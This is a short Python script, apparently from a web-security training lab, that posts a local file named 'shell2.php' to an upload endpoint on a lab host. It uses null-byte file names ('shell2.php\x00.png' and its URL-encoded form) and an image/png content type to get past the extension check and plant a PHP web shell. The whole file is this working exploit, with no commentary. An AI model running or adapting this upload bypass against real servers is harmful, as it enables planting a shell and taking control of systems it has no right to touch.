#!/usr/bin/env python3

import requests

url = "http://web0x05.hbtn/api/task2/"
headers = {"Host": "test-s3.web0x05.hbtn"}

payloads = [
    "shell2.php\x00.png",
    "shell2.php%00.png",
]

with open("shell2.php", "rb") as source:
    content = source.read()

for name in payloads:
    files = {
        "file": (
            name,
            content,
            "image/png",
        )
    }

    response = requests.post(
        url,
        headers=headers,
        files=files,
        timeout=10,
    )

    print(repr(name), "=>", response.status_code, response.text)
